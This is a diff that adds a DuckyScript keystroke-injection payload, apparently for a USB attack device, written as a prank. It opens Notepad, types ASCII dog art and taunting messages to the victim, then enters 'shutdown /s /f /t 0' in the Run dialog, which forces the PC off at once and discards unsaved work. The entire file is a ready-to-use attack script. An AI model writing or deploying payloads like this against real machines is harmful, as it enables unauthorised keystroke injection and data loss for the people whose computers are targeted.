@@ -1,0 +1,36 @@
+REM Fullscreen mode and ASCII Dog Art in Notepad, then shutdown
+
+REM 1. Windows Fullscreen (maximize window)
+GUI UP
+DELAY 500
+
+REM 2. Open Notepad
+GUI r
+DELAY 500
+STRING notepad
+ENTER
+DELAY 1000
+
+REM 3. Insert ASCII Art (Dog) into Notepad
+STRING  / \__
+ENTER
+STRING (    @\___
+ENTER
+STRING /         O
+ENTER
+STRING /   (_____/
+ENTER
+STRING /_____/   U
+ENTER
+ENTER
+STRING Bro really got hacked by a dog lol
+ENTER
+STRING This PC will now turn off, bozo
+ENTER
+DELAY 2000
+
+REM 4. Shutdown the PC immediately
+GUI r
+DELAY 500
+STRING shutdown /s /f /t 0
+ENTER
